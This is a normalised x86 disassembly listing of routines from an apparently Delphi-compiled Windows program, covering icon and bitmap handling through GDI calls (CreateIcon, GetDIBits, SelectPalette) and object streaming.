mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41f0c4
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407c78
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41f5d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5d7
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026ec
retn
call sub_41e834
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41f280
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41f28c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41f63c
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41e7bc
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cbc
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41ea6c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41f720
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41f63c
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41f78c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41f63c
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f829
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f830
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41f860
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402cbc
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41f854
xor edx edx
push ebp
push sub_41fa4e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41f720
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41f720
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41fa27
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407c78
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407c78
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407c78
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407c78
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41f78c
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41f78c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa2e
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026ec
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41fa2e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa55
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41fa5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41faac
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41fb04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41faac
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fb4d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031e8
mov edi eax
mov eax esi
call sub_4031e8
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fc87
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fc6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407da4
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc71
mov al 0x1
sub_41fca0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416330
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fce8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fcef
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_41fcf4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41fd28
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416330
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fd73
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd7a
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_41fda0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41fe1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_413de4
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4031f0
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4042d8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404480
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe25
lea eax [ ebp - 0x8 ]
call sub_404074
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41fe34
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
adc bh bh
inc ecx
add [ ecx ] dl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
inc esi
outsd
jb r-xdata
psubsb mm3 [ esi ]
aaa
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
mov eax eax
sub_41fe90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_41ff3c
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_41ff3c
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_41ff3c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ff10
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a0
mov eax [ esi + 0x8 ]
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41ff3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_413c88
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ff80
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_413c88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ffa4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_413de4
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413de4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_420000
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_420030
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4031e8
mov edx eax
mov eax [ ebx + 0xc ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414518
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_420064
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_40342c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4032a0
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4034b4
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4034b4
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40349c
sub_4200e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_420170
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4031e8
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034b4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034b4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420190
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_41ffa4
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420207
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034b4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_41e7a4
mov eax [ ebx + 0xc ]
call sub_4032a0
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4034b4
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40349c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_420254
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_4202c8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_4200e0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_4200e0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414434
mov edx ebx
mov eax esi
call sub_4200e0
jmp r-xdata
pop esi
pop ebx
retn
sub_420324
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_420348
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_420370
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420477
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4042d8
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41fda0
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4203f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42047e
lea eax [ ebp - 0x48 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034b4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034b4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4203fe
mov eax [ ebp - 0x4 ]
call sub_4032a0
call sub_403a54
call sub_403aa8
mov eax [ ebx + 0xc ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42047e
lea eax [ ebp - 0x48 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034b4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034b4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_420488
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4031f0
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402bac
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_4204e4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
